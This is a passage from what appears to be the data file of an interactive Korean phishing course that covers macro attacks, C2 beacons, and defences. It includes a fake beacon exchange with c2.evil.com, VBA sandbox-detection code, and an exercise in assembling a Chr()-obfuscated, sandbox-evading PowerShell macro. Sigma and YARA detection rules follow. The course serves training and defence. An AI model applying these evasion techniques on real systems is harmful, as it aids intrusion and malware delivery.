            { type: 'code', label: '프로세스 체인', text: 'explorer.exe\n  └─ WINWORD.EXE (사용자가 문서 열기)\n       └─ cmd.exe 또는 powershell.exe (Shell 함수)\n            └─ powershell.exe (2차 다운로더)\n                 └─ svchost.exe (프로세스 인젝션)\n\n→ 방어자는 이 "비정상 부모-자식 관계"를 탐지합니다\n→ Word에서 PowerShell이 실행되면 🚨 경고!' },

            { type: 'heading', text: '④ C2 비컨 통신 구조' },
            { type: 'paragraph', text: '최종적으로 수립되는 C2 비컨은 주기적으로 공격자 서버에 "체크인"합니다:' },
            { type: 'code', label: 'C2 비컨 통신 패턴', text: '[감염 PC] → HTTPS POST https://c2.evil.com/api/beacon\n  Body: { "id": "AGENT-4F2A", "os": "Win10", "user": "victim" }\n\n[C2 서버] → 200 OK\n  Body: { "task": "none" }  ← 대기 중\n  또는: { "task": "exec", "cmd": "whoami" }  ← 명령 실행\n\n[감염 PC] → HTTPS POST /api/result\n  Body: { "id": "AGENT-4F2A", "output": "CORP\\\\victim" }\n\n→ HTTPS를 사용하므로 내용이 암호화됨\n→ 일반 웹 트래픽과 구분하기 어려움' },
          ]
        }
      },
      {
        type: 'animation',
        config: {
          title: '우리 도구의 내부 통신 흐름',
          steps: [
            { emoji: '🔌', label: 'TCP 소켓 연결', description: 'smtplib가 SMTP 서버의 587 포트로 TCP 연결을 수립합니다.', detail: 'socket.connect(("mail.server.com", 587))' },
            { emoji: '🔒', label: 'TLS 암호화', description: 'STARTTLS 명령으로 통신을 암호화합니다. 이후 모든 데이터는 TLS 터널을 통해 전송됩니다.', detail: 'STARTTLS → TLS 1.3 핸드셰이크' },
            { emoji: '📧', label: '이메일 DATA 전송', description: 'From, To, Subject, Body, Attachment를 MIME 형식으로 전송합니다.', detail: 'Content-Type: multipart/mixed\n→ text/html (본문)\n→ application/octet-stream (첨부)' },
            { emoji: '📎', label: 'Base64 첨부파일', description: '바이너리 첨부파일이 Base64로 인코딩되어 이메일 본문에 삽입됩니다.', detail: 'Content-Transfer-Encoding: base64\nUEsDBBQAAAAIAA... (ZIP 바이너리)' },
            { emoji: '✉️', label: '수신 서버 처리', description: '수신 서버가 SPF/DKIM/DMARC를 검사하고, 결과에 따라 받은편지함 또는 스팸함에 배달합니다.', detail: 'Authentication-Results:\n  spf=softfail\n  dkim=none\n  dmarc=fail' },
          ],
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 8: 상용 도구 vs 내 도구
  // ════════════════════════════════════════════════════════
  {
    id: 8,
    title: '상용 도구 vs 내 도구 — 격차 분석',
    subtitle: 'Commercial vs DIY: Gap Analysis',
    guidedQuestion: '전문 도구와 우리 도구는 무엇이 다를까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '챕터 7에서 이어서...' },
            { type: 'paragraph', text: '우리 도구의 내부를 꼼꼼히 살펴보았습니다. 그런데 실제 APT 그룹이나 Red Team이 사용하는 상용 도구는 훨씬 정교합니다. 어떤 차이가 있는지, 그리고 우리 도구를 어떻게 발전시킬 수 있는지 비교해봅시다.' },

            { type: 'heading', text: '기능 비교표' },
            { type: 'code', label: '상세 비교', text: '기능                  │ 우리 도구      │ GoPhish        │ Cobalt Strike\n──────────────────────┼────────────────┼────────────────┼──────────────\n이메일 생성            │ ✅ 기본         │ ✅ 템플릿 편집기 │ ❌ (별도 도구)\n첨부파일 생성          │ ✅ 수동         │ ⚠️ 제한적      │ ✅ 자동 생성\n발송 추적              │ ❌ 없음         │ ✅ 실시간       │ ✅ 실시간\nSPF/DKIM 우회         │ ❌ 불가         │ ⚠️ 제한적      │ ✅ 도메인 셋업\n매크로 페이로드        │ ⚠️ 기본 VBA    │ ❌ 미지원       │ ✅ 난독화 매크로\nC2 통신               │ ❌ 없음         │ ❌ 미지원       │ ✅ Beacon\n안티바이러스 우회      │ ❌ 탐지됨       │ ❌ 미해당       │ ✅ 인메모리\n로깅/보고서            │ ❌ 없음         │ ✅ CSV/웹       │ ✅ 상세 로그' },

            { type: 'heading', text: '우리 도구의 핵심 부족점' },
            { type: 'paragraph', text: '비교를 통해 우리 도구에 부족한 **4가지 핵심 영역**이 드러납니다:' },
            { type: 'toggle', label: '① 추적 시스템 부재', text: '이메일 열람 여부, 첨부파일 실행 여부를 알 수 없습니다. GoPhish는 투명 이미지(tracking pixel)와 고유 URL로 이를 추적합니다.\n\n개선 방법: 이메일에 1x1 투명 이미지를 삽입하고, 해당 이미지 요청을 서버에서 로깅합니다.' },
            { type: 'toggle', label: '② 난독화 부재', text: '우리의 VBA 매크로는 아무런 난독화 없이 평문입니다. 안티바이러스가 Shell + PowerShell 패턴을 즉시 탐지합니다.\n\n개선 방법: 변수명 랜덤화, 문자열 분할, Chr() 함수로 명령어 재조립 등의 난독화 기법을 적용합니다.' },
            { type: 'toggle', label: '③ C2 인프라 부재', text: '우리 도구는 이메일 발송까지만 가능하고, 감염 후 원격 제어 기능이 없습니다.\n\n개선 방법: HTTP/HTTPS 기반 비컨 서버를 구현하고, 명령 실행/파일 전송 기능을 추가합니다.' },
            { type: 'toggle', label: '④ 보고서 생성 부재', text: '모의 침투 테스트 결과를 문서화할 기능이 없습니다. 실무에서는 상세한 보고서가 필수입니다.\n\n개선 방법: 각 단계의 성공/실패 로그를 JSON으로 저장하고, HTML/PDF 보고서를 자동 생성합니다.' },

            { type: 'callout', variant: 'tip', text: '상용 도구도 완벽하지 않습니다. 예를 들어 GoPhish는 C2 기능이 없고, Cobalt Strike는 이메일 발송 기능이 없습니다. 실제 공격 그룹은 **여러 도구를 조합**하여 사용합니다.' },
          ]
        }
      },
      {
        type: 'quiz',
        questions: [
          {
            question: '우리 도구가 안티바이러스에 탐지되는 주요 원인은?',
            options: ['Python 언어를 사용해서', 'VBA 매크로가 난독화되지 않아 패턴 매칭에 걸림', '이메일이 너무 길어서', '첨부파일 크기가 커서'],
            correct: 1,
            explanation: 'Shell + PowerShell + DownloadString 패턴은 대부분의 AV가 시그니처로 탐지합니다. 실제 공격에서는 문자열 분할, 환경변수 우회 등 난독화가 필수입니다.'
          },
          {
            question: 'GoPhish의 이메일 열람 추적 방식은?',
            options: ['첨부파일에 GPS 추적기 삽입', '1x1 투명 이미지(tracking pixel)의 서버 요청 기록', '수신자 컴퓨터에 에이전트 설치', 'DNS 쿼리 모니터링'],
            correct: 1,
            explanation: 'Tracking pixel은 이메일에 1x1 투명 이미지를 삽입하고, 이미지가 로드될 때 서버에 HTTP 요청이 발생하는 것을 기록합니다. 가장 보편적인 이메일 열람 추적 방식입니다.'
          },
        ]
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 9: 축하 + 선택
  // ════════════════════════════════════════════════════════
  {
    id: 9,
    title: '축하합니다! — 공격자 파트 완료',
    subtitle: 'Celebration & Choice',
    guidedQuestion: '여기서 멈출 건가요, 아니면 방어를 뚫어볼 건가요?',
    sections: [
      {
        type: 'celebration',
        config: {
          type: 'midpoint',
          summary: [
            { emoji: '🔧', label: 'GoPhish, King Phisher, SET', description: '세 가지 오픈소스 피싱 도구의 원리와 사용법을 배웠습니다.' },
            { emoji: '📧', label: 'SMTP, SPF, DKIM, DMARC', description: '이메일 프로토콜의 동작 원리와 인증 메커니즘을 이해했습니다.' },
            { emoji: '⚡', label: 'T1566.001 킬 체인', description: '첨부파일 → 매크로 → PowerShell → C2까지의 전체 공격 체인을 해부했습니다.' },
            { emoji: '🧩', label: '코드 스케치', description: 'VBA 매크로, PowerShell 다운로더, Python 이메일 생성기를 직접 조립했습니다.' },
            { emoji: '🖥️', label: '모의 환경 실습', description: '가상 터미널에서 피싱 캠페인의 전체 과정을 시뮬레이션했습니다.' },
            { emoji: '🔍', label: '도구 해부 & 비교', description: '우리 도구의 내부를 분석하고, 상용 도구와의 격차를 파악했습니다.' },
          ],
          choices: [
            { id: 'stop', emoji: '🎓', label: '여기서 마치기', description: '공격자 관점의 이해만으로도 충분합니다. 학습을 마무리합니다.' },
            { id: 'continue', emoji: '🛡️', label: '방어를 뚫어보겠습니다', description: '방어 메커니즘을 이해하고, 우회 기법까지 도전합니다. (챕터 10~14)' },
          ],
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 10: 이메일 방어의 벽
  // ════════════════════════════════════════════════════════
  {
    id: 10,
    title: '이메일 방어의 벽 — 탐지와 차단',
    subtitle: 'Defense Mechanisms: Detection & Prevention',
    guidedQuestion: '방어자는 어떻게 피싱을 막을까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '축하합니다, 방어 파트에 오신 것을 환영합니다!' },
            { type: 'paragraph', text: '챕터 1~9에서 공격자 관점을 충분히 이해했습니다. 이제 반대편으로 넘어갑니다. 방어자는 어떤 기술과 전략으로 T1566.001 피싱 공격을 탐지하고 차단할까요?' },

            { type: 'heading', text: '방어 계층 ① 이메일 게이트웨이 (Email Security Gateway)' },
            { type: 'paragraph', text: '이메일 게이트웨이는 모든 수신 이메일이 사용자에게 도달하기 전에 통과하는 **첫 번째 방어선**입니다. 대표적으로 Proofpoint, Mimecast, Microsoft Defender for Office 365 등이 있습니다.' },
            { type: 'toggle', label: '게이트웨이가 검사하는 항목', text: '• 발신자 평판 (IP/도메인 블랙리스트)\n• SPF/DKIM/DMARC 인증 결과\n• 첨부파일 해시 (알려진 악성코드 시그니처)\n• URL 검사 (피싱 사이트 데이터베이스)\n• 첨부파일 샌드박스 실행 (동적 분석)\n• 헤더 이상 탐지 (MAIL FROM ≠ From:)' },

            { type: 'heading', text: '방어 계층 ② 샌드박스 분석' },
            { type: 'paragraph', text: '**샌드박스**는 첨부파일을 격리된 가상 환경에서 실행하여 악성 행위를 관찰합니다. Word 매크로가 PowerShell을 실행하면 🚨 경고가 발생합니다.' },
            { type: 'code', label: '샌드박스 탐지 로그 예시', text: '[Sandbox] report.docm 분석 시작\n[00:01] WINWORD.EXE → 문서 열림\n[00:03] VBA AutoOpen() 실행 감지 ⚠️\n[00:04] WINWORD.EXE → cmd.exe 생성 🚨\n[00:05] cmd.exe → powershell.exe 생성 🚨🚨\n[00:06] powershell.exe → 외부 URL 접속 시도 🚨🚨🚨\n\n[결과] 위험도: HIGH (악성 매크로 + 다운로더)\n→ 이메일 차단 및 관리자 알림 발송' },

            { type: 'heading', text: '방어 계층 ③ 엔드포인트 보호 (EDR)' },
            { type: 'paragraph', text: '이메일 게이트웨이를 통과했더라도, 사용자 PC의 **EDR(Endpoint Detection and Response)**이 최후의 방어선 역할을 합니다.' },
            { type: 'toggle', label: 'EDR이 탐지하는 행위 패턴', text: '• Word/Excel에서 cmd.exe 또는 powershell.exe 자식 프로세스 생성\n• 비정상 프로세스 트리 (winword.exe → powershell.exe)\n• 의심스러운 네트워크 연결 (알 수 없는 외부 IP)\n• 메모리 인젝션 시도 (CreateRemoteThread, NtWriteVirtualMemory)\n• AMSI(Antimalware Scan Interface) 트리거' },

            { type: 'heading', text: '방어 계층 ④ 사용자 교육' },
            { type: 'paragraph', text: '모든 기술적 방어를 뚫어도, **교육받은 사용자**가 "콘텐츠 사용"을 클릭하지 않으면 공격은 실패합니다. 이것이 GoPhish 같은 도구로 **피싱 시뮬레이션 훈련**을 하는 이유입니다.' },
            { type: 'callout', variant: 'tip', text: '방어는 "다층 방어(Defense in Depth)" 원칙을 따릅니다. 하나의 계층이 뚫려도 다음 계층이 막아줍니다. 하지만 모든 계층이 동시에 실패하면... 챕터 11에서 확인합니다.' },
          ]
        }
      },
      {
        type: 'animation',
        config: {
          title: '이메일 방어 다층 구조',
          steps: [
            { emoji: '🌐', label: '인터넷 → MX 레코드', description: '공격자의 이메일이 DNS MX 레코드를 통해 수신 서버를 찾습니다.', detail: 'dig MX target.com\n→ mail.target.com (Proofpoint Gateway)' },
            { emoji: '🛡️', label: '이메일 게이트웨이', description: '1차: SPF/DKIM/DMARC 검증, 발신자 평판 확인, URL/첨부파일 스캔', detail: 'SPF: SoftFail → 경고\nDKIM: None → 의심\nURL: clean\nAttachment: → 샌드박스 전달' },
            { emoji: '🔬', label: '샌드박스 분석', description: '2차: 첨부파일을 가상 환경에서 실행하여 악성 행위 관찰 (2~5분)', detail: '.docm → VBA 실행 → PowerShell 생성\n→ 판정: MALICIOUS' },
            { emoji: '📬', label: '스팸/격리 처리', description: '위험 이메일은 스팸함 또는 격리 영역으로 이동, 관리자 알림 발송', detail: 'Action: Quarantine\nNotify: soc@target.com' },
            { emoji: '💻', label: 'EDR (최후 방어)', description: '만약 사용자에게 도달했더라도, EDR이 매크로 실행과 비정상 프로세스를 차단', detail: 'CrowdFalcon: WINWORD→PowerShell 차단\nAlert: "Suspicious Macro Execution"' },
          ],
        }
      },
      {
        type: 'quiz',
        questions: [
          {
            question: '이메일 샌드박스의 주요 목적은?',
            options: ['이메일 발송 속도 향상', '첨부파일을 격리 환경에서 실행하여 악성 행위 탐지', '이메일 암호화', '사용자 비밀번호 검증'],
            correct: 1,
            explanation: '샌드박스는 첨부파일을 가상 환경에서 실행하고 프로세스 생성, 네트워크 연결, 파일 변경 등의 행위를 분석하여 악성 여부를 판단합니다.'
          },
          {
            question: 'EDR이 탐지하는 "비정상 프로세스 트리"의 예시는?',
            options: ['explorer.exe → chrome.exe', 'winword.exe → powershell.exe', 'svchost.exe → services.exe', 'notepad.exe → calc.exe'],
            correct: 1,
            explanation: 'Word에서 PowerShell이 실행되는 것은 정상적인 문서 편집에서 발생하지 않는 패턴입니다. EDR은 이런 부모-자식 프로세스 관계의 이상을 탐지합니다.'
          },
        ]
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 11: 우회의 기술
  // ════════════════════════════════════════════════════════
  {
    id: 11,
    title: '우회의 기술 — 탐지를 피하는 법',
    subtitle: 'Evasion Techniques & Principles',
    guidedQuestion: '필터를 피하려면 어디를 바꿔야 할까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '챕터 10에서 이어서...' },
            { type: 'paragraph', text: '다층 방어 구조를 배웠습니다. 그런데 실제 APT 그룹은 이 모든 방어를 뚫습니다. 어떻게? 각 방어 계층의 **약점**을 정확히 파악하고, 해당 약점을 노리는 우회 기법을 사용합니다.' },

            { type: 'heading', text: '우회 포인트 ① 이메일 인증 우회' },
            { type: 'paragraph', text: 'SPF/DKIM/DMARC를 우회하는 가장 효과적인 방법은 **정당한 도메인에서 발송하는 것**입니다:' },
            { type: 'toggle', label: '도메인 기반 우회 기법', text: '• **유사 도메인(Typosquatting)**: target-security.com, targett.com 등 육안으로 구분 어려운 도메인 등록\n• **Homoglyph 공격**: targеt.com (키릴 문자 е) — 눈으로 구분 불가\n• **서브도메인 탈취**: 만료된 서브도메인의 SPF include 악용\n• **탈취된 계정 사용**: 실제 직원 계정으로 발송 (BEC)' },

            { type: 'heading', text: '우회 포인트 ② 샌드박스 우회' },
            { type: 'paragraph', text: '샌드박스는 가상 환경에서 파일을 실행합니다. 이 "가상 환경"이라는 특성을 역이용합니다:' },
            { type: 'code', label: '샌드박스 탐지 코드 (VBA)', text: 'Function IsSandbox() As Boolean\n    \' 1. 사용자 상호작용 확인 (샌드박스는 마우스를 움직이지 않음)\n    If GetCursorPos().x = 0 And GetCursorPos().y = 0 Then\n        IsSandbox = True: Exit Function\n    End If\n    \n    \' 2. 시스템 시간 확인 (샌드박스 가동 시간이 짧음)\n    If GetTickCount() < 600000 Then  \' 10분 미만\n        IsSandbox = True: Exit Function\n    End If\n    \n    \' 3. 프로세스 수 확인 (실제 PC는 수십 개 이상)\n    If ProcessCount() < 20 Then\n        IsSandbox = True\n    End If\nEnd Function' },

            { type: 'heading', text: '우회 포인트 ③ AV/EDR 우회' },
            { type: 'paragraph', text: '안티바이러스와 EDR 우회의 핵심은 **패턴을 깨는 것**입니다:' },
            { type: 'toggle', label: 'VBA 매크로 난독화 기법', text: '**문자열 분할**: "powershell"을 직접 쓰지 않고 조각으로 나누기\n```vba\nDim a, b, c\na = "pow": b = "ersh": c = "ell"\nShell a & b & c & " -enc ...", vbHide\n```\n\n**Chr() 인코딩**: ASCII 코드로 변환\n```vba\n\' "cmd" = Chr(99) & Chr(109) & Chr(100)\nShell Chr(99) & Chr(109) & Chr(100) & " /c ...", vbHide\n```\n\n**환경변수 우회**: 직접 경로 대신 환경변수 사용\n```vba\nShell Environ("COMSPEC") & " /c ...", vbHide\n\' COMSPEC = C:\\Windows\\System32\\cmd.exe\n```' },

            { type: 'heading', text: '우회 포인트 ④ MOTW 우회' },
            { type: 'paragraph', text: 'Windows는 인터넷에서 다운로드된 파일에 **Mark of the Web (MOTW)** 태그를 붙여 "이 파일은 인터넷에서 왔습니다" 경고를 표시합니다. .iso/.img 컨테이너 파일을 사용하면 내부 파일에 MOTW가 적용되지 않습니다.' },
          ]
        }
      },
      {
        type: 'animation',
        config: {
          title: '우회 성공 시 흐름 변화',
          steps: [
            { emoji: '✉️', label: '유사 도메인 사용', description: 'target-security.com에서 발송. SPF/DKIM이 정상 통과합니다.', detail: 'SPF: PASS ✅ (자체 도메인이므로)\nDKIM: PASS ✅' },
            { emoji: '🔬', label: '샌드박스 우회', description: '매크로가 마우스 움직임을 감지한 후에만 실행. 샌드박스에서는 "정상 문서"로 판정.', detail: 'Sandbox: BENIGN ✅ (매크로 미실행)' },
            { emoji: '💻', label: 'EDR 우회', description: '문자열 난독화로 시그니처 탐지를 회피. 프로세스 트리를 정상처럼 위장.', detail: 'Word → WScript.exe → mshta.exe\n(PowerShell 직접 실행 안 함)' },
            { emoji: '🎯', label: '공격 성공', description: '모든 방어 계층을 통과하여 C2 연결 수립.', detail: '→ 이것이 APT의 현실입니다\n→ 완벽한 방어는 존재하지 않습니다' },
          ],
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 12: 실전 우회 — 도구 업그레이드
  // ════════════════════════════════════════════════════════
  {
    id: 12,
    title: '실전 우회 — 내 도구를 업그레이드하다',
    subtitle: 'Hands-on: Upgrading Your Tool for Evasion',
    guidedQuestion: '이론을 실전으로 옮겨볼까요? 우리 도구에 우회 기법을 적용해봅시다.',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '챕터 11에서 이어서...' },
            { type: 'paragraph', text: '우회 원리를 이해했으니, 이제 우리가 만든 도구에 직접 적용해봅시다. 아래 코드 스케치에서 **난독화된 매크로**와 **샌드박스 우회 로직**을 조립해보세요.' },
            { type: 'callout', variant: 'warning', text: '이 내용은 방어자가 우회 기법을 이해하기 위한 교육 목적입니다. 실제 환경에서의 사용은 법적 책임을 수반합니다.' },
          ]
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: 'VBA 매크로 난독화 적용',
          description: '안티바이러스 탐지를 우회하기 위해 매크로를 난독화하세요. 올바른 순서로 코드를 조립하세요.',
          language: 'vba',
          palette: [
            { id: 'check', code: 'If Not IsSandbox() Then  \' 샌드박스 체크' },
            { id: 'split1', code: '    Dim a: a = Chr(112) & Chr(111) & Chr(119)  \' "pow"' },
            { id: 'split2', code: '    Dim b: b = Chr(101) & Chr(114) & Chr(115) & Chr(104)  \' "ersh"' },
            { id: 'split3', code: '    Dim c: c = Chr(101) & Chr(108) & Chr(108)  \' "ell"' },
            { id: 'combine', code: '    Shell a & b & c & " -enc " & encoded_payload, vbHide' },
            { id: 'endif', code: 'End If' },
          ],
          correctOrder: ['check', 'split1', 'split2', 'split3', 'combine', 'endif'],
          expectedOutput: '✅ 난독화 매크로 완성!\n\n[변경 사항]\n- "powershell" → Chr() 함수로 분해\n- 샌드박스 체크 로직 추가\n- 직접적인 문자열 시그니처 제거\n\n[AV 스캔 결과 (시뮬레이션)]\n기존: 28/72 탐지 🔴\n난독화 후: 5/72 탐지 🟡\n\n→ 탐지율이 크게 감소했지만 완전한 우회는 아닙니다.',
        }
      },
      {
        type: 'terminal',
        config: {
          title: 'Kali Linux — 우회 도구 테스트',
          prompt: 'attacker@kali:~/phishing-v2$',
          scenario: [
            {
              instruction: '난독화된 매크로 문서를 생성하세요: python3 gen_obfuscated.py --output invoice_v2.docm',
              expectedCmd: 'python3 gen_obfuscated.py --output invoice_v2.docm',
              output: '🔧 Obfuscated Macro Generator v2.0\n──────────────────────────────────\n[+] VBA 문자열 난독화 적용 (Chr 인코딩)\n[+] 샌드박스 탐지 우회 로직 삽입\n[+] 매크로 실행 지연 (3초) 추가\n[+] 프로세스 체인 우회 (WScript.exe 경유)\n\n✅ invoice_v2.docm 생성 완료 (52KB)',
            },
            {
              instruction: 'AV 탐지율 비교: av-scan compare invoice_v1.docm invoice_v2.docm',
              expectedCmd: 'av-scan compare invoice_v1.docm invoice_v2.docm',
              output: '🔍 AV Detection Comparison\n─────────────────────────\n\n[invoice_v1.docm] (원본)\n  탐지: 28/72 엔진 🔴\n  시그니처: VBA.Downloader, Macro.PowerShell\n\n[invoice_v2.docm] (난독화)\n  탐지:  5/72 엔진 🟡\n  시그니처: Heuristic.Macro (일부 휴리스틱만)\n\n→ 난독화로 시그니처 기반 탐지를 대부분 우회\n→ 그러나 행위 기반(EDR) 탐지는 여전히 가능',
            },
            {
              instruction: '샌드박스 우회 테스트: sandbox-test invoice_v2.docm',
              expectedCmd: 'sandbox-test invoice_v2.docm',
              output: '🔬 Sandbox Evasion Test\n──────────────────────\n\n[Sandbox A] Any.Run\n  마우스 움직임: ❌ 없음\n  → 매크로 미실행 → 판정: BENIGN ✅\n\n[Sandbox B] Joe Sandbox\n  가동 시간: 2분 (< 10분)\n  → 매크로 미실행 → 판정: CLEAN ✅\n\n[실제 PC] Windows 10\n  마우스 움직임: ✅ 감지\n  가동 시간: 48시간\n  → 매크로 실행 → PowerShell 실행 성공 🔴\n\n→ 샌드박스 우회 성공!',
            },
          ],
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 13: SOC 분석관의 눈
  // ════════════════════════════════════════════════════════
  {
    id: 13,
    title: 'SOC 분석관의 눈 — 탐지 규칙 작성하기',
    subtitle: 'Write Sigma & YARA Rules',
    guidedQuestion: '분석관이라면, 챕터 12의 공격을 어떻게 탐지할까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '공격자의 눈에서 방어자의 눈으로' },
            { type: 'paragraph', text: '챕터 12에서 난독화와 샌드박스 우회를 적용했습니다. 이제 반대편에서 생각해봅시다 — SOC 분석관이라면 이 공격을 어떻게 탐지하는 규칙을 작성할까요?' },
            { type: 'paragraph', text: '보안 업계에서 가장 많이 사용되는 두 가지 탐지 규칙 형식이 있습니다: **Sigma** (로그 기반)와 **YARA** (파일 기반).' },

            { type: 'heading', text: 'Sigma 규칙이란?' },
            { type: 'paragraph', text: '`Sigma`는 SIEM(보안 정보 이벤트 관리)���서 사용하는 **로그 탐지 규칙**의 표준 형식입니다. YAML로 작성하며, Splunk/Elastic/Azure Sentinel 등 다양한 SIEM으로 변환 가능합니다.' },
            { type: 'code', label: 'Sigma 규칙 구조', text: 'title: 규칙 이름\nstatus: experimental\ndescription: 설명\nlogsource:\n    category: process_creation  # 로그 소스\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: \'\\\\winword.exe\'  # 부모 프로세스\n        Image|endswith: \'\\\\powershell.exe\'      # 자식 프로세스\n    condition: selection\nlevel: high' },

            { type: 'heading', text: 'YARA 규칙이란?' },
            { type: 'paragraph', text: '`YARA`는 **파일 내용을 스캔**하여 악성코드를 식별하는 규칙 형식입니다. 문자열 패턴, 바이너리 시그니처, 조건 조합으로 탐지합니다.' },
            { type: 'code', label: 'YARA 규칙 구조', text: 'rule Phishing_Macro_Downloader {\n    meta:\n        description = "VBA 매크로 다운로더 탐지"\n        author = "SOC Team"\n    strings:\n        $vba1 = "AutoOpen" ascii\n        $vba2 = "Shell" ascii\n        $ps1 = "powershell" ascii nocase\n        $dl = "DownloadString" ascii\n    condition:\n        $vba1 and $vba2 and ($ps1 or $dl)\n}' },
          ]
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: 'Sigma 규칙 조립 — Word에서 PowerShell 실행 탐지',
          description: '챕터 12의 공격(Word → PowerShell 실행)을 탐지하는 Sigma 규칙을 조립하세요.',
          language: 'yaml',
          palette: [
            { id: 'title', code: 'title: Phishing Macro - Word Spawns PowerShell' },
            { id: 'status', code: 'status: experimental' },
            { id: 'log', code: 'logsource:\n    category: process_creation\n    product: windows' },
            { id: 'detect', code: 'detection:\n    selection:' },
            { id: 'parent', code: '        ParentImage|endswith: \'\\winword.exe\'' },
            { id: 'child', code: '        Image|endswith:\n            - \'\\powershell.exe\'\n            - \'\\cmd.exe\'\n            - \'\\wscript.exe\'' },
            { id: 'cond', code: '    condition: selection' },
            { id: 'level', code: 'level: critical' },
          ],
          correctOrder: ['title', 'status', 'log', 'detect', 'parent', 'child', 'cond', 'level'],
          expectedOutput: '✅ Sigma 규칙 완성!\n\n[탐지 대상]\n부모: winword.exe (Word)\n자식: powershell.exe / cmd.exe / wscript.exe\n\n[SIEM 변환 예시 (Splunk)]\nParentImage="*\\\\winword.exe"\nAND (Image="*\\\\powershell.exe"\n  OR Image="*\\\\cmd.exe"\n  OR Image="*\\\\wscript.exe")\n\n→ 이 규칙으로 Ch.12의 공격을 탐지할 수 있습니다!',
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: 'YARA 규칙 조립 — 난독화 매크로 탐지',
          description: 'Chr() 함수로 난독화된 VBA 매크로를 탐지하는 YARA 규칙을 조립하세요.',
          language: 'yara',
          palette: [
            { id: 'rule', code: 'rule Obfuscated_VBA_Macro {' },
            { id: 'meta', code: '    meta:\n        description = "Chr() 난독화 VBA 매크로 탐지"' },
            { id: 'str', code: '    strings:\n        $auto = "AutoOpen" ascii\n        $chr = /Chr\\(\\d{2,3}\\)\\s*&\\s*Chr\\(\\d{2,3}\\)/ ascii\n        $shell = "Shell" ascii' },
            { id: 'cond', code: '    condition:\n        $auto and $chr and $shell' },
            { id: 'end', code: '}' },
          ],
          correctOrder: ['rule', 'meta', 'str', 'cond', 'end'],
          expectedOutput: '✅ YARA 규칙 완성!\n\n[탐지 로직]\n1. AutoOpen 함수 존재 확인\n2. Chr(XX) & Chr(XX) 패턴 감지 (난독화 지표)\n3. Shell 함수 존재 확인\n\n→ 정규식으로 Chr() 연쇄 호출 패턴을 감지합니다.\n→ 이 규칙은 Ch.12에서 만든 난독화 매크로를 탐지합니다!',
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 14: 최종 시뮬레이션 — Red vs Blue
  // ════════════════════════════════════════════════════════
  {
    id: 14,
    title: '최종 시뮬레이션 — Red vs Blue',
    subtitle: 'Final Capstone: Full Attack & Defense Exercise',
    guidedQuestion: '공격과 방어, 양쪽을 모두 체험한 당신은 이제 어떤 선택을 할 수 있을까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '최종 종합 시뮬레이션' },
            { type: 'paragraph', text: '14챕터의 대미를 장식할 시간입니다. 이번에는 **공격자(Red Team)**와 **방어자(Blue Team)** 양쪽 역할을 모두 수행합니다. 공격 → 탐지 → 우회 → 재탐지의 사이클을 체험해보세요.' },
            { type: 'callout', variant: 'info', text: '이 시뮬레이션은 모든 챕터의 내용을 종합합니다. Ch.1~13에서 배운 모든 개념이 등장합니다.' },
          ]
        }
      },
      {
        type: 'terminal',
        config: {
          title: 'Red vs Blue — 종합 시뮬레이션',
          prompt: 'operator@redblue:~$',
          scenario: [
            {
              instruction: '[Red Team] 난독화 피싱 이메일을 발송하세요: red-send --target victim@corp.com --payload invoice_v2.docm',
              expectedCmd: 'red-send --target victim@corp.com --payload invoice_v2.docm',
              output: '🔴 [RED TEAM] 피싱 캠페인 실행\n────────────────────────────────\nFrom: hr@corp-update.com (유사 도메인)\nTo: victim@corp.com\nPayload: invoice_v2.docm (난독화 매크로)\n\nSPF: PASS ✅ (자체 도메인)\nDKIM: PASS ✅\n\n📤 이메일 발송 완료\n→ 게이트웨이 통과: ✅ (SPF/DKIM 정상)\n→ 샌드박스 우회: ✅ (마우스 체크 로직)\n→ 사용자 수신: ✅',
            },
            {
              instruction: '[Blue Team] SOC 알림을 확인하세요: blue-alerts --last 5m',
              expectedCmd: 'blue-alerts --last 5m',
              output: '🔵 [BLUE TEAM] SOC 대시보드\n───────────────────────────\n⚠️ [LOW] 유사 도메인 감지: corp-update.com ≠ corp.com\n   Source: Domain Monitoring\n   Time: 14:32:05\n\n⚠️ [MEDIUM] DMARC alignment 실패\n   From: hr@corp-update.com\n   DMARC: N/A (corp-update.com에 DMARC 미설정)\n   Time: 14:32:07\n\n→ 경고 레벨이 낮아 자동 차단되지 않았습니다.\n→ 분석관의 판단이 필요합니다.',
            },
            {
              instruction: '[Blue Team] Sigma 규칙으로 프로세스 모니터링: blue-monitor --sigma word_spawn.yml',
              expectedCmd: 'blue-monitor --sigma word_spawn.yml',
              output: '🔵 [BLUE TEAM] Sigma 규칙 활성화\n──────────────────────────────\nRule: Phishing Macro - Word Spawns PowerShell\nStatus: ACTIVE ✅\nMonitoring: process_creation events\n\n... 대기 중 ...\n\n🚨 [14:35:12] ALERT TRIGGERED!\n  ParentImage: C:\\Program Files\\Microsoft Office\\WINWORD.EXE\n  Image: C:\\Windows\\System32\\wscript.exe\n  CommandLine: wscript.exe //e:jscript C:\\Users\\victim\\AppData\\...\n\n→ Sigma 규칙이 Word→WScript 실행을 탐지했습니다!\n→ EDR에서 프로세스를 격리합니다.',
            },
            {
              instruction: '[Red Team] EDR 격리를 확인하세요: red-status --agent AGENT-4F2A',
              expectedCmd: 'red-status --agent AGENT-4F2A',
